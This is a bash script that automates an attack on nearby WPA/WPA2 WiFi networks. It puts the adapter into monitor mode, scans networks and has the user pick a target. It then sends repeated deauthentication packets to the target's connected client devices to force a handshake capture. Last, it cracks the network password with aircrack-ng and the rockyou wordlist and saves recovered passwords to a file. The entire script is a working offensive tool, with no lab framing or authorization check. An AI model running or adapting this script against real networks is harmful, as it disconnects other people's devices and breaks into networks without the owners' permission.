#!/bin/bash

# Start the script while connected to internet in order to download rockyou wordlist if not exist in it's path

sudo apt update
sudo apt install aircrack-ng -y 
sudo apt install gnome-terminal -y
sudo apt install wget -y


UN=$SUDO_USER
current_date=$(date +"%d_%m_%y")
path="/home/$UN/Desktop/wifi_Targets"
scan_input="$path/Scan/Scan-$current_date.csv"
mkdir -p "$path"
if [ -d "$path/Scan" ]; then
    rm -rf "$path/Scan"
fi
mkdir "$path/Scan"
sudo chown -R $UN:$UN $path




function check_wordlist() {
    wordlists_dir="/usr/share/wordlists"
    rockyou_file="$wordlists_dir/rockyou.txt"
    rockyou_gz="$wordlists_dir/rockyou.txt.gz"

    # Check if /usr/share/wordlist directory exists, if not, create it
    if [ ! -d "$wordlists_dir" ]; then
        sudo mkdir -p "$wordlists_dir"
        echo "wordlist folder created"
    fi

    # Check if rockyou.txt exists, if yes, continue code
    if [ -f "$rockyou_file" ]; then
        echo "rockyou.txt found"
        # Continue your code here
    else
        # Check if rockyou.gz exists, if yes, unzip it
        if [ -f "$rockyou_gz" ]; then
            echo "rockyou.gz found. Unzipping..."
            sudo gzip -d "$rockyou_gz"
            # Continue your code here
        else
            echo "Downloading the rockyou file..."
            sudo wget -q -P $wordlists_dir https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt 
            wait
        fi
    fi
}



function check_adapter() {
	if iwconfig wlan0 &> /dev/null; then
	    wifi_adapter="wlan0"
	    echo "WiFi adapter detected: wlan0"
	    echo "Starting $wifi_adapter in monitor mode"
	    sudo airmon-ng start "$wifi_adapter"
	elif iwconfig wlan1 &> /dev/null; then
	    wifi_adapter="wlan1"
	    echo "WiFi adapter detected: wlan1"
	    echo "Starting $wifi_adapter in monitor mode"
	    sudo airmon-ng start "$wifi_adapter"    
	elif iw dev wlan0mon info &>/dev/null; then
	    wifi_adapter="wlan0"
	    echo "Great! Your wifi adapter: $wifi_adapter already in monitor mode"
	elif iw dev wlan1mon info &>/dev/null; then
	    wifi_adapter="wlan1"
	    echo "Great! Your wifi adapter: $wifi_adapter already in monitor mode"
	else
	    read -p "WiFi adapter not detected. Please enter the name of your WiFi adapter: " wifi_adapter
	    echo "Starting $wifi_adapter in monitor mode"
	    sudo airmon-ng start "$wifi_adapter"
	fi    
}



function network_scanner() {	
        clear
        # Scan 10 seconds for wifi networks    
        sudo gnome-terminal --geometry=93x35-10000-10000 -- timeout 10s sudo airodump-ng "$wifi_adapter"mon --ignore-negative-one --output-format csv -w $path/Scan/Scan-$current_date        
        countdown_duration=10
        echo -e "\e[1;34mScanning available WiFi Networks ($countdown_duration s):\e[0m"

        for (( i=$countdown_duration; i>=1; i-- )); do
            tput cuu1 && tput el
            echo -e "\e[1;34mScanning for available WiFi Networks:\033[1;31m\033[1m $i \033[0m"
            sleep 1
        done
        mv $path/Scan/Scan-$current_date-01.csv $scan_input
        cp "$scan_input" "$scan_input.original"
        # Edit original scan file to more organized one:
        awk -F, 'BEGIN {OFS=","} {print $1, $4, $6, $14}' "$scan_input" > "$scan_input.tmp"  && mv "$scan_input.tmp" "$scan_input"
        awk '/^Station MAC,/ {print; exit} {print}' "$scan_input" > "$scan_input.tmp"  && mv "$scan_input.tmp" "$scan_input"
        awk '$4 != ""' "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"
        tail -n +2 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"
        head -n -1 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"
        #clear
        echo -e "\033[1;33mAvalible WiFi Networks:\033[0m\n"
        # Display the scan input file contents with row numbers
        printf "    Name: %-35s Encryption: %-6s Channel: %-5s BSSID: %-1s\n" 
        echo
        nl -w2 -s', ' "$scan_input" | awk -F', ' '{printf "%-1s. %-42s %-16s %-16s %-5s\n", $1, $5, $4, $3, $2}'
        echo
        # Prompt the user to choose a row number
        read -p "Enter row number: " row_number
        echo
        function is_valid_number() {
            re='^[0-9]+$'
            if ! [[ $1 =~ $re ]]; then
                echo -e "\033[1;31m\033[1m\nError:\033[0m Not a valid number."
                return 1
            fi

            num_rows=$(wc -l < "$scan_input")
            if (( $1 < 1 || $1 > num_rows )); then
                echo -e "\033[1;31m\033[1m\nError:\033[0m Row number out of range."
                return 1
            fi

            return 0
        }

        # Keep asking for row number until a valid one is entered
        while ! is_valid_number "$row_number"; do
            echo
            read -p "Enter row number: " row_number
            echo
        done

        # Extracting values from airodump-ng scan file
        chosen_row=$(awk -v row="$row_number" 'NR == row' "$scan_input")
        bssid_address=$(echo "$chosen_row" | awk -F', ' '{print $1}')
        channel=$(echo "$chosen_row" | awk -F', ' '{print $2}')
        encryption=$(echo "$chosen_row" | awk -F', ' '{print $3}')
        bssid_name=$(echo "$chosen_row" | awk -F', ' '{print $4}')

        # Remove "/" from bssid name
        if [[ $bssid_name == *"/"* ]]; then
            bssid_name=${bssid_name//\//}
        fi

        # Echo values
        echo -e "\033[1;31m\033[1mBSSID Name:\033[0m $bssid_name"
        echo -e "\033[1;31m\033[1mMAC Address:\033[0m $bssid_address"
        if [ "$encryption" = "OPN" ]; then
            echo -e "\033[1;31m\033[1mEncryption:\033[0m none"
        else
            echo -e "\033[1;31m\033[1mEncryption:\033[0m $encryption"
        fi
        echo -e "\033[1;31m\033[1mChannel:\033[0m $channel"
        echo
        echo

        if [ "$encryption" = "WPA3" ]; then
            echo -e "\033[1mThe encryption is WPA3. Can't crack it yet.\033[0m"
            another_scan_prompt
        elif [ "$encryption" = "OPN" ]; then
            echo -e "\033[1mThe Network is open.\033[0m"
            another_scan_prompt
        fi

        # if directory exist from previous scan then delete it & create new
        if [ -d $path/"$bssid_name" ]; then
            rm -r $path/"$bssid_name"
        fi
        mkdir $path/"$bssid_name"

        echo "Validating network:"
        gnome-terminal --geometry=93x15-10000-10000 -- script -c "sudo airodump-ng -c $channel -w '$path/$bssid_name/$bssid_name' -d $bssid_address $wifi_adapter"mon"" "$path/$bssid_name/airodump_output.txt"
        #sleep 10

	timeout=10  # Time for Checking network availability
	found=0
	for (( i=0; i<$timeout; i++ )); do
	    if [ "$(grep -c "$bssid_address" "$path/$bssid_name/airodump_output.txt")" -ge 2 ]; then
		found=1
		echo -e "Network available! \n"
		break
	    fi
	    sleep 1
	done

	if [ $found -eq 0 ]; then
	    sudo pkill aireplay-ng
	    sudo pkill airodump-ng
	    echo -e "\033[1mNetwork appears to be offline now.\033[0m"
	    another_scan_prompt
	fi
}



function devices_scanner() {
	echo -e "\e[1m\nStart scanning for devices ->>\e[0m"
	for ((i=1; i<=10; i++)); do
	    target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$path/$bssid_name/$bssid_name-01.kismet.netxml")

	    if [ -n "$target_devices" ]; then
		echo -e "\033[1;33m\nDevices_Found:\033[0m $target_devices" | tr ' ' '\n'
		echo
		break
	    fi
	    echo -e "Scanning for devices..  \e[1;34m$i/10\e[0m"
	    sleep 6
	done

	if [ -z "$target_devices" ]; then
	    echo -e "\033[1m\nNo device were found.\033[0m"
	    sudo pkill airodump-ng
	    rm -r $path/"$bssid_name"
	    another_scan_prompt
	fi
	sleep 3
}



function deauth_attack() {
	# Check if we capture the handshake - Before the attack:
	if sudo grep -q "WPA handshake: $bssid_address" "$path/$bssid_name/airodump_output.txt"; then
	    echo -e "\033[1;32m->> Got the handshake!\033[0m"
	    sudo pkill aireplay-ng
	    sudo pkill airodump-ng
	    echo
	    echo --- >> $path/wifi_passwords.txt
	    printf "We got handshake for: %-30s at %s\n" "$bssid_name" "$(date +"%H:%M %d/%m/%y")" >> "$path/wifi_passwords.txt"
	# Starting deauth attack and waiting for handshake:      
	else
	    echo -e "\033[1;31m\033[1mStarting deauth attack ->>\033[0m"
	    # trying 10 times (3 minutes) the deauth attack
	    for ((i=1; i<=10; i++)); do        
		target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$path/$bssid_name/$bssid_name-01.kismet.netxml")
		
		for target_device in $target_devices; do
		    gnome-terminal --geometry=1x1-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 0 -a "$bssid_address" -c "$target_device" "$wifi_adapter"mon
		done
		
		echo -e "Attempt \e[1;34m$i/10\e[0m to capture handshake of:"         
		echo -e "$target_devices" | tr ' ' '\n',
		echo
		# waiting 18 sec after deauth attack while looking for handshake:
		for ((j=1; j<=18; j++)); do
		    sleep 1
		    if sudo grep -q "WPA handshake: $bssid_address" "$path/$bssid_name/airodump_output.txt"; then
		        echo -e "\033[1;32m->> Got the handshake!\033[0m"
		        sudo pkill aireplay-ng
			sudo pkill airodump-ng
			echo
			echo --- >> $path/wifi_passwords.txt
			echo "We got handshake for:   $bssid_name                  ($(date +"%H:%M %d/%m/%y"))" >> "$path/wifi_passwords.txt"
			break 2
		    fi    
		done
	    # after 6 unseccessfull attempts, quit the script:
	    if [ "$i" == 10 ]; then
	    	echo -e "\033[1m\nNo handshake obtained within 2 minutes. Try again.\033[0m"
	    	sudo pkill aireplay-ng
		sudo pkill airodump-ng
		rm -r $path/"$bssid_name"
		another_scan_prompt
	    fi    
	  
	    done       
	fi
}



function dictionary_attack() {
	# Cracking the Password
	echo -e "\e[1m\nCracking wifi password with rockyou wordlist ->>\n\e[0m"
	sudo aircrack-ng "$path/$bssid_name/$bssid_name"*.cap -w /usr/share/wordlists/rockyou.txt -l "$path/$bssid_name/$bssid_name-wifi_password.txt"
	echo
	if [ -f "$path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
	    wifi_pass=$(cat "$path/$bssid_name/$bssid_name-wifi_password.txt")
	    echo -e "The wifi password of \033[1;31m\033[1m$bssid_name\033[0m is:	\033[1;31m\033[1m$wifi_pass\033[0m"
	    echo "The wifi password is:   $wifi_pass" >> $path/wifi_passwords.txt
	    exit_settings
	    exit 1
	else
	    echo -e "\nCouldn't finf a match from rockyou wordlist.."
	    another_scan_prompt
	fi
}



function another_scan_prompt() {
    echo
    read -p "Do you want to run another scan? (Y/n): " answer
    echo
    case $answer in
        [Yy]* ) 
            main_process ;;
        [Nn]* ) 
            echo -e "\nBye."
	    exit_settings
            exit 1 ;;
        * ) 
            while true; do
                echo "Please answer yes or no (Y/n)."
                echo
                read -p "Do you want to run another scan? (Y/n): " answer
                echo
                case $answer in
                    [Yy]* ) 
                        main_process
                        break ;;
                    [Nn]* ) 
                        echo -e "\nBye." 
                        exit_settings
                        exit 1 ;;
                esac
            done ;;
    esac
}



function exit_settings() {
	sudo chown -R $UN:$UN $path
	gnome-terminal --geometry=1x1-10000-10000 -- sudo airmon-ng stop "$wifi_adapter"mon
	gnome-terminal --geometry=1x1-10000-10000 -- sudo systemctl start NetworkManager
}



function main_process() {
	network_scanner
	devices_scanner
	deauth_attack
	dictionary_attack
}


check_wordlist
check_adapter
sudo airmon-ng check kill


main_process





# Fix:


# To Do:
# - Add sort by power
# - hushcut - gpu
# - add more wordlists 
# - WPA2-WPA3
# - WPA3
